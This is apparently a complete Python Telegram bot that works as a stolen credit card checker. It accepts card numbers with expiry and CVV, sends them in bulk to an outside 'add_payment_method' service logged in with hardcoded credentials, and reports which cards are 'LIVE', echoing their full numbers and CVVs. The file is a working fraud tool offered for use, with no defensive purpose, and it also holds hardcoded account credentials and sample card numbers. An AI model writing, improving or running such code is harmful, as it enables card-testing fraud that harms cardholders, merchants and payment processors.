import os
import re
import requests
import urllib.parse
import asyncio
import aiohttp
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from typing import List, Dict, Any

# Configuration
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
BASE_API_URL = "https://andul-1.onrender.com/add_payment_method"
EMAIL = "sogaged371@hudisk.com"
PASSWORD = "sogaged371@"

# Simplified Bank database
BANK_DATABASE = {
    "4": {"brand": "VISA", "country": "USA"},
    "5": {"brand": "MASTERCARD", "country": "USA"},
    "34": {"brand": "AMEX", "country": "USA"},
    "37": {"brand": "AMEX", "country": "USA"},
    "6": {"brand": "DISCOVER", "country": "USA"},
}

async def check_card_api(session: aiohttp.ClientSession, card_info: Dict[str, Any]) -> Dict[str, Any]:
    """Check a single card via API (async)."""
    try:
        card_string = f"{card_info['card_number']}|{card_info['month']}|{card_info['year']}|{card_info['cvv']}"
        encoded_card = urllib.parse.quote(card_string, safe='')
        api_url = f"{BASE_API_URL}/{EMAIL}/{PASSWORD}/{encoded_card}"
        
        async with session.get(api_url, timeout=10) as response:
            text = await response.text()
            status = get_status(text)
            
            # Get brand from BIN
            bin_num = card_info['bin']
            brand = BANK_DATABASE.get(bin_num[0], {"brand": "UNKNOWN", "country": "UNKNOWN"})["brand"]
            
            return {
                "card": f"{card_info['bin']}...{card_info['last4']}",
                "full_card": card_info['card_number'],
                "exp": f"{card_info['month']}/{card_info['year_full']}",
                "cvv": card_info['cvv'],
                "status": status,
                "brand": brand,
                "is_live": "✅" in status,
                "raw": card_info['line']
            }
    except:
        return {
            "card": f"{card_info['bin']}...{card_info['last4']}",
            "full_card": card_info['card_number'],
            "exp": f"{card_info['month']}/{card_info['year_full']}",
            "cvv": card_info['cvv'],
            "status": "❌ ERROR",
            "brand": "UNKNOWN",
            "is_live": False,
            "raw": card_info['line']
        }

def get_status(response_text: str) -> str:
    """Get clean status from response."""
    if not response_text:
        return "❌ NO RESPONSE"
    
    text = response_text.lower()
    
    if any(word in text for word in ["payment method added", "successfully added", "approved", "success"]):
        return "✅ LIVE"
    elif any(word in text for word in ["card declined", "your card was declined"]):
        return "❌ DECLINED"
    elif any(word in text for word in ["card number is incorrect", "invalid card"]):
        return "❌ INCORRECT"
    elif any(word in text for word in ["insufficient funds"]):
        return "❌ NO FUNDS"
    elif any(word in text for word in ["expired card"]):
        return "❌ EXPIRED"
    elif any(word in text for word in ["incorrect cvc"]):
        return "❌ WRONG CVC"
    else:
        return "⚠️ UNKNOWN"

def parse_card_line(line: str) -> Dict[str, Any]:
    """Parse card line quickly."""
    match = re.match(r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$', line.strip())
    if not match:
        return None
    
    card_number = match.group(1)
    month = match.group(2).zfill(2)
    year_input = match.group(3)
    cvv = match.group(4)
    
    year_api = year_input[-2:] if len(year_input) == 4 else year_input
    year_full = "20" + year_api if len(year_api) == 2 else year_input
    
    return {
        "card_number": card_number,
        "month": month,
        "year": year_api,
        "year_full": year_full,
        "cvv": cvv,
        "bin": card_number[:6],
        "last4": card_number[-4:],
        "line": line.strip()
    }

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command."""
    await update.message.reply_text(
        "⚡ *FAST CARD CHECKER*\n\n"
        "*Single Check:*\n"
        "`/chk 532854|12|28|923`\n\n"
        "*Mass Check (1-30 cards):*\n"
        "`/mass` then send cards\n\n"
        "*Format:*\n"
        "`CARD|MM|YY|CVV`",
        parse_mode='Markdown'
    )

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle single card check."""
    if not context.args:
        await update.message.reply_text("❌ Use: `/chk CARD|MM|YY|CVV`", parse_mode='Markdown')
        return
    
    user_input = " ".join(context.args)
    await check_single(update, user_input)

async def check_single(update: Update, card_input: str):
    """Check single card."""
    card_info = parse_card_line(card_input)
    if not card_info:
        await update.message.reply_text("❌ Wrong format!")
        return
    
    msg = await update.message.reply_text(f"🔍 Checking...")
    
    async with aiohttp.ClientSession() as session:
        result = await check_card_api(session, card_info)
    
    response = f"💳 *CARD:* `{result['card']}`\n"
    response += f"📅 *EXP:* {result['exp']} | *CVV:* {result['cvv']}\n"
    response += f"🏷️ *BRAND:* {result['brand']}\n"
    response += "─" * 30 + "\n"
    response += f"*STATUS:* {result['status']}\n"
    
    if result['is_live']:
        response += f"*FULL CARD:* `{result['full_card']}`\n"
    
    await msg.edit_text(response, parse_mode='Markdown')

async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start mass checking."""
    context.user_data['mass_cards'] = []
    context.user_data['mass_mode'] = True
    
    await update.message.reply_text(
        "📦 *MASS CHECK*\n\n"
        "Send cards (1-30), one per line:\n"
        "`5328544152353125|12|28|923`\n"
        "`4111111111111111|12|25|123`\n\n"
        "Then send `/done`",
        parse_mode='Markdown'
    )

async def done_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process mass cards."""
    if 'mass_cards' not in context.user_data or not context.user_data['mass_cards']:
        await update.message.reply_text("❌ No cards!")
        context.user_data['mass_mode'] = False
        return
    
    cards = context.user_data['mass_cards']
    
    if len(cards) > 30:
        await update.message.reply_text(f"❌ Max 30! You sent {len(cards)}")
        context.user_data['mass_mode'] = False
        return
    
    await process_mass_fast(update, cards)

async def process_mass_fast(update: Update, cards: List[Dict[str, Any]]):
    """Process multiple cards FAST."""
    total = len(cards)
    msg = await update.message.reply_text(f"⚡ Checking {total} cards...")
    
    # Check all cards concurrently
    async with aiohttp.ClientSession() as session:
        tasks = [check_card_api(session, card) for card in cards]
        results = await asyncio.gather(*tasks, return_exceptions=True)
    
    # Filter out exceptions
    valid_results = [r for r in results if isinstance(r, dict)]
    
    # Separate live and dead
    live_cards = [r for r in valid_results if r['is_live']]
    dead_cards = [r for r in valid_results if not r['is_live']]
    
    # Build response
    response = f"📊 *MASS CHECK COMPLETE*\n"
    response += "─" * 30 + "\n"
    response += f"✅ *LIVE:* {len(live_cards)}\n"
    response += f"❌ *DEAD:* {len(dead_cards)}\n"
    response += f"📁 *TOTAL:* {total}\n"
    response += "─" * 30 + "\n\n"
    
    # Show LIVE cards
    if live_cards:
        response += "🎯 *LIVE CARDS:*\n"
        for i, card in enumerate(live_cards, 1):
            response += f"{i}. `{card['full_card']}|{card['exp'].replace('/', '|')}|{card['cvv']}`\n"
            response += f"   {card['brand']} | {card['exp']} | {card['cvv']}\n"
    
    # Show dead cards summary
    if dead_cards:
        response += f"\n❌ *DEAD CARDS:* {len(dead_cards)}\n"
        # Group by status
        status_counts = {}
        for card in dead_cards:
            status = card['status']
            status_counts[status] = status_counts.get(status, 0) + 1
        
        for status, count in status_counts.items():
            response += f"   {status}: {count}\n"
    
    # Send in multiple messages if too long
    if len(response) > 4000:
        # Split at live cards section
        parts = response.split("\n\n")
        for part in parts:
            if part.strip():
                await update.message.reply_text(part, parse_mode='Markdown')
    else:
        await msg.edit_text(response, parse_mode='Markdown')
    
    # Clean up
    context.user_data['mass_mode'] = False
    if 'mass_cards' in context.user_data:
        del context.user_data['mass_cards']

async def handle_mass_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle mass card input."""
    if not context.user_data.get('mass_mode', False):
        return
    
    text = update.message.text.strip()
    lines = text.split('\n')
    
    valid_cards = []
    for line in lines:
        card = parse_card_line(line)
        if card:
            valid_cards.append(card)
    
    if 'mass_cards' not in context.user_data:
        context.user_data['mass_cards'] = []
    
    context.user_data['mass_cards'].extend(valid_cards)
    total = len(context.user_data['mass_cards'])
    
    await update.message.reply_text(f"✅ Added {len(valid_cards)} | Total: {total}/30")

async def handle_direct_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle direct card input."""
    if context.user_data.get('mass_mode', False):
        await handle_mass_input(update, context)
        return
    
    text = update.message.text.strip()
    if re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', text):
        await check_single(update, text)

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel mass check."""
    if 'mass_mode' in context.user_data:
        context.user_data['mass_mode'] = False
        if 'mass_cards' in context.user_data:
            del context.user_data['mass_cards']
        await update.message.reply_text("❌ Cancelled")

def main():
    """Start the bot."""
    if TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ Set TELEGRAM_BOT_TOKEN")
        return
    
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    # Commands
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("chk", chk_command))
    app.add_handler(CommandHandler("check", chk_command))
    app.add_handler(CommandHandler("mass", mass_command))
    app.add_handler(CommandHandler("done", done_command))
    app.add_handler(CommandHandler("cancel", cancel_command))
    
    # Handlers
    app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^\.chk\s+'), chk_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_direct_card))
    
    print("⚡ FAST CARD CHECKER BOT")
    print("Commands: /chk, /mass, /done")
    app.run_polling()

if __name__ == '__main__':
    main()
